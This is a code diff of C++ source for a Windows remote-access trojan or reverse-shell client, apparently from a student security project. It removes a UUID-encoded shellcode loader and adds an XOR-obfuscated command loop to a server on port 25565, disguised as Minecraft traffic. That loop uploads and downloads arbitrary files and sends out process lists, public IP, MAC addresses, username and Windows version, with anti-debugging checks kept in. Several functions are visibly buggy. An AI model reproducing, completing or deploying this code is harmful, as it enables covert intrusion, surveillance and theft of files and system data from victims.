@@ -8,6 +8,7 @@ Windows reverse shell
 #include <stdio.h>
 #include <tlhelp32.h>
 #include <iostream>
+#include <sstream>
 #include <Lmcons.h>
 #include <wininet.h>
 #include <winsock.h>
@@ -22,52 +23,302 @@ Windows reverse shell
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "Rpcrt4.lib")
 
-#define PORT "25565" //Default port for Minecraft Java
+#define SERV_PORT "25565" //Default port for Minecraft Java
 #define SERV_ADDR "127.0.0.1"
 #define DEFAULT_BUFFER_LEN 40000
 using namespace std;
 
-
-
-// decrypt data using UuidFromStringA to decode data and write shellcode to memory (idea from Lazarus group)
-// first UUID=XOR key | second UUID=XOR'd command code | third-last UUID=command call / shellcode
-// data is an array of uuids.
-int decode(char* data) {
-	int elements = sizeof data / sizeof(data[0]);
-
-	//lpAddress, dwSize, flAllocationType, flProtect
-	VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE); //hide this WinAPI call later
-	DWORD_PTR scptr = (DWORD_PTR)mem;
-	for (int i = 2; i < elements; i++) { //start at 2 bcs 0 is key and 1 is callcode
-		//detect_debugger();
-		
-		// print statements for debugging
-		printf("[*] Allocating %d of %d uuids\n", i + 1, elements);
-		printf("%s\n", *(data + i));
-		RPC_CSTR rpc_cstr = dec_uuid((data + i), key);
-		RPC_CSTR rpc_cstr = (RPC_CSTR) * (data + i);
-		//	Invoking UuidFromStringA with a memory pointer instead of a UUID pointer results in
-		//the binary repressentation of the given UUID being stored in memory.
-		//This is engineered this way so that it is possible to load a payload content (shellcode) into the 
-		//chosen memory region.
-		RPC_STATUS status = UuidFromStringA((RPC_CSTR)rpc_cstr, (UUID*)scptr);
-		if (status != RPC_S_OK) {
-			printf("UUID Conversion Error");
-			CloseHandle(mem);
-			return -1;
+// used to encrypt/decrypt data
+void xor_func(char * data, int len) {
+	const char * key = "RITSEC";
+	for (int i = 0; i < len; i++) {
+		unsigned char kb = data[i] ^ key[i % 6];
+		if (data[i] != 0x00 && kb != 0x00) {
+			data[i] = kb;
 		}
-		scptr += 16; //increment position for the next UUID in memory (16 bytes ahead)
 	}
-	//Specify the memory region holding the shellcode for pointer to callback in EnumChildWindows (execution)
-	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
-	CloseHandle(mem);
-	return 0;
 }
 
-// receive data from server
-void recv() {
+std::string getNetworkInfo() {
+	std::string nwInfo;
+	PIP_ADAPTER_INFO pAdapterInfo;
+	PIP_ADAPTER_INFO pAdapter = NULL;
+	DWORD dwRetVal = 0;
 
+	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+	pAdapterInfo = (IP_ADAPTER_INFO*) malloc(sizeof(IP_ADAPTER_INFO));
+	if (pAdapterInfo == NULL) {
+		return "";
+	}
+
+	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+		free(pAdapterInfo);
+		pAdapterInfo = (IP_ADAPTER_INFO*) malloc(ulOutBufLen);
+		if (pAdapterInfo == NULL) {
+			return "";
+		}
+	}
+
+	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
+		pAdapter = pAdapterInfo;
+		while (pAdapter) {
+			nwInfo += pAdapter->IpAddressList.IpAddress.String;
+			nwInfo += ",";
+			pAdapter = pAdapter->Next;
+		}
+	}
+	if (pAdapterInfo)
+		free(pAdapterInfo);
+	return nwInfo;
 }
+
+std::string getUsername() {
+	char userbuf[512];
+	int length;
+	GetUserNameA(userbuf, (LPDWORD)&length);
+	std::string pname(userbuf);
+	return pname;
+}
+
+std::string getMACs() {
+	std::string mac;
+    ULONG size = 0;
+	
+	// Get the network adapter information
+    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &size) != ERROR_BUFFER_OVERFLOW) {
+        return ""; // if buffer overflow: ret blank
+    }
+    PIP_ADAPTER_ADDRESSES adapterAddresses = (PIP_ADAPTER_ADDRESSES)malloc(size);
+    if (adapterAddresses == NULL) {
+        return ""; // if not adapter addresses: ret blank
+    }
+    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapterAddresses, &size) != NO_ERROR) {
+        free(adapterAddresses);
+        return ""; // if errors: ret blank
+    }
+
+    // Iterate over the network adapters and find the MAC address
+    PIP_ADAPTER_ADDRESSES adapter = adapterAddresses;
+    while (adapter != NULL) {
+        if (adapter->PhysicalAddressLength > 0) {
+            char macBuff[18];
+			// format mac into string
+            sprintf_s(macBuff, sizeof(macBuff), "%02X:%02X:%02X:%02X:%02X:%02X",
+                adapter->PhysicalAddress[0], adapter->PhysicalAddress[1], adapter->PhysicalAddress[2],
+                adapter->PhysicalAddress[3], adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
+            mac = macBuff;
+            break;
+        }
+        adapter = adapter->Next;
+    }
+
+    // Clean up, Clean Up, Everybody Do your share!
+    free(adapterAddresses);
+    return mac;
+}
+
+// Function for getting the public facing IP address.
+std::string getPublicIP() {
+	HANDLE hInternet = InternetOpen(L"Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL, 0);
+	// Create hConnect handle for ifconfig.me
+	HANDLE hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	// Pass hConnect handle into HttpOpenRequestA with request to ifconfig.me/ip
+	HANDLE hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
+	// Helper function returns response string generated by ifconfig.me
+	std::string resp = get_response_string(hRequest);
+	if (hRequest) { // If hRequest is successful: teardown (In reverse order of creation!!!)
+		InternetCloseHandle(hRequest);
+	}
+	if (hConnect) { // If hConnect is successful: teardown
+		InternetCloseHandle(hConnect);
+	}
+	return resp;
+}
+
+// Helper function for getPublicIP()
+std::string get_response_string(HANDLE hReq) {
+	BOOL reqSuccess = HttpSendRequestA(hReq, NULL, NULL, NULL, NULL);
+	if (reqSuccess) {
+		// Initialize variables for internetReadFile
+		DWORD recvData = 0;
+		DWORD chunkSize = 2048;
+		std::string buf;
+		std::string chunk(chunkSize, 0);
+		while (InternetReadFile(hReq, &chunk[0], chunkSize, &recvData) && recvData) {
+			chunk.resize(recvData);
+			buf += chunk;
+		}
+		//return file read buffer data
+		return buf;
+	}
+	return nullptr;
+}
+
+std::string getWinVer() {
+    // Get the version information of the current operating system
+    OSVERSIONINFOEX osvi;
+    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
+    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+    GetVersionEx((OSVERSIONINFO*)&osvi); // Retrieve specific version of windows w/ GetVersionEx
+
+    // Extract the major and minor version numbers
+    int majorVersion = osvi.dwMajorVersion;
+    int minorVersion = osvi.dwMinorVersion;
+
+    // Get the build number if it is available
+    int buildNumber = 0;
+    if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT && majorVersion >= 6) {
+        ULONGLONG conditionMask = 0;
+        VER_SET_CONDITION(conditionMask, VER_BUILDNUMBER, VER_GREATER_EQUAL);
+        osvi.dwBuildNumber = 0;
+        // Verify that the system meets the condition
+        if (VerifyVersionInfo(&osvi, VER_BUILDNUMBER, conditionMask)) {
+            buildNumber = osvi.dwBuildNumber;
+        }
+    }
+
+    // Determine the returned string based on the operating system
+    std::ostringstream oss;
+    oss << "Windows ";
+    switch (majorVersion) {
+    case 10:
+        oss << "10";
+        break;
+    case 6:
+        switch (minorVersion) {
+        case 3:
+            oss << "8.1";
+            break;
+        case 2:
+            oss << "8";
+            break;
+        case 1:
+            oss << "7";
+            break;
+        case 0:
+            oss << "Vista";
+            break;
+        }
+        break;
+    case 5:
+        switch (minorVersion) {
+        case 2:
+            oss << "Server 2003";
+            break;
+        case 1:
+            oss << "XP";
+            break;
+        case 0:
+            oss << "2000";
+            break;
+        }
+        break;
+    }
+    if (buildNumber > 0) {
+        oss << " (Build " << buildNumber << ")";
+    }
+    return oss.str();
+}
+
+//use previous functions in information string.
+std::string getSysInfo() {
+	return "PUBLIC IP:\n" + getPublicIP() + "\n" + "MAC Addresses:\n" + getMACs() + "\n" + "NETWORK INFO:\n" + getNetworkInfo() + "\n" + "USERNAME:\n" + getUsername() + "\n" + "WINDOWS VERSION:\n" + getWinVer();
+}
+
+//get data from process and turn it into human readable/understandable information
+std::string getProcToStr() {
+	std::string proclst;
+	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 procEntry;
+	procEntry.dwSize = sizeof(PROCESSENTRY32);
+	Process32First(hTH32, &procEntry);
+	do
+	{
+		std::wstring wpname(procEntry.szExeFile);
+		std::string pname(wpname.begin(), wpname.end());
+		proclst += pname;
+		proclst += ":";
+		char buf[UNLEN + 1];
+		DWORD len = UNLEN + 1;
+		// 10 is for base 10
+		_itoa_s(procEntry.th32ProcessID, buf, 10);
+		buf[UNLEN] = 0;
+		proclst += buf;
+		proclst += "\n";
+	} while (Process32Next(hTH32, &procEntry));
+	return proclst;
+}
+
+// Client uploads to server.
+void handle_upload(SOCKET csocket, char * path) {
+// L
+
+	int filesize = 0;
+	int total_read = 0;
+	char buf[1024] = {0};
+	DWORD current_read_bytes;
+	DWORD read_bytes;
+
+	// read file size
+	recv(csocket, (char *)&filesize, 4, 0);
+
+	printf("UPLOAD: Creating file %s\n", path);
+	HANDLE fhandle = CreateFileA((LPCSTR) path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (fhandle == INVALID_HANDLE_VALUE) {
+		printf("oops %d", GetLastError());
+		exit(-1);
+	}
+
+	while (total_read < filesize) {
+		current_read_bytes = recv(csocket, buf, 1024, 0);
+		xor_func(buf, current_read_bytes);
+		if(!WriteFile(fhandle, buf, current_read_bytes, &read_bytes, 0)) {
+			exit(-2);
+		}
+		total_read += current_read_bytes;
+	}
+	CloseHandle(fhandle);
+}
+
+// Client handles download from server.
+void handle_download(SOCKET csocket, char * path) {
+// L
+	int filesize = 0;
+	int total_read = 0;
+	char buf[1024] = {0};
+	DWORD current_read_bytes = 0;
+	DWORD read_bytes = 0;
+
+	// read file size
+
+	HANDLE fhandle = CreateFileA((LPCSTR) path, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (fhandle == INVALID_HANDLE_VALUE) {
+		printf("error in CreateFileA bruh: %d\n", GetLastError());
+		exit(-1);
+	}
+
+	// get file size
+
+	filesize = GetFileSize(fhandle, NULL);
+	printf("filesize: %d\n", filesize);
+	if (filesize == INVALID_FILE_SIZE) {
+		printf("error in filesize bruh: %d\n", GetLastError());
+	}
+	// send file size
+	send(csocket, (char *)&filesize, 4, 0);
+
+	while (total_read < filesize) {		
+		if (!ReadFile(fhandle, buf, 1024, &read_bytes, NULL)) {
+			printf("ReadFile Error: %d", GetLastError());
+		}
+		total_read += read_bytes;
+		// xor data
+		xor_func(buf, read_bytes);
+		send(csocket, buf, read_bytes, 0);
+	}
+	CloseHandle(fhandle);
+}
+
 // anti-debugging measures
 void detect_debugger() {
 	__try {
@@ -75,15 +326,142 @@ void detect_debugger() {
 	}
 	__except (GetExceptionCode() == EXCEPTION_BREAKPOINT ?
 		EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
-		continue;		//if debugger not present continue
+			//if debugger not present continue
+			//Do Something
 	}
 }
 
-// client automatically assumes the server is sending it XOR encrypted shellcode to execute unless
-// otherwise specified in the uuid message prepend. See Readme.md for uuid message prepend codes.
-void main() {
-	detect_debugger();
-	//recv();
+int main(int argc, char const* argv[]) {
+	char filepath[4096];
+	WSADATA wsaData;
+	struct sockaddr_in server;
+	SOCKET csocket;
+	int iResult; 
+	int command;
+	int command_packet_length;	
 
+	struct addrinfo* result = NULL,
+		* ptr = NULL,
+		hints;
+
+	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+	if (iResult != 0) {
+		printf("WSAStartup failed with error: %d\n", iResult);
+		return 1;
+	}
+
+	if ((csocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+		printf("Socket creation failed: %d", WSAGetLastError());
+		WSACleanup();
+		return 1;
+	}
+
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	iResult = getaddrinfo(SERV_ADDR, SERV_PORT, &hints, &result);
+	if (iResult != 0) {
+		printf("getaddrinfo failed: %d\n", iResult);
+		WSACleanup();
+		return 1;
+	}
+
+	ptr = result;
+
+	iResult = connect(csocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+	if (iResult == SOCKET_ERROR) {
+		closesocket(csocket);
+		printf("Unable to connect to server!\n");
+		WSACleanup();
+		return 1;
+	}
+
+	puts("Connection to server successful");
+
+	while(true) {
+
+		std::string procs;
+		int length;
+		char* thing;
+		// read command type
+		recv(csocket, (char *)&command, 4, 0);
+		printf("Command type: %d\n", command);
+		// read command length
+		recv(csocket, (char *)&command_packet_length, 4, 0);
+		
+ 		char * path = (char *)malloc(command_packet_length);
+
+		ZeroMemory(path, command_packet_length);
+
+		switch(command) {
+			case -1:
+				puts("oops");
+				break;
+			case 0:
+				puts("upload");
+				
+				// read the file path (length bytes)
+				// read command_packet_length bytes into filename
+				// open file and read data into it
+
+				recv(csocket, path, command_packet_length, 0);
+				path[command_packet_length] = 0x00;
+				// xor();
+				// xor the filepath
+				// open the file
+
+				handle_upload(csocket, path);
+
+				// read file data and save in file
+				break;
+			case 1:
+				puts("download");
+
+				recv(csocket, path, command_packet_length, 0);
+				path[command_packet_length] = 0x00;
+
+				handle_download(csocket, path);
+				// read command_packet_length bytes into filename
+				// open filename, send chunks back out socket
+				break;
+			case 2:
+				puts("processes");
+				procs = getProcToStr();
+				length = procs.length();
+				thing = (char *) malloc(length);
+
+				memcpy(thing, procs.c_str(), length);
+
+				xor_func(thing, length);
+
+				send(csocket, (char *)&length, 4, 0);
+				send(csocket, thing, length, 0);
+
+				free(thing);
+				
+				// get the processes
+				break;
+			case 3:
+				puts("sysinfo");
+				// getSysInfo();
+				procs = getSysInfo();
+				length = procs.length();
+				thing = (char *) malloc(length);
+
+				memcpy(thing, procs.c_str(), length);
+
+				xor_func(thing, length);
+
+				send(csocket, (char *)&length, 4, 0);
+				send(csocket, thing, length, 0);
+
+				free(thing);
+				// length = 0;
+				break;
+		}
+		free(path);
+	}
 
 }
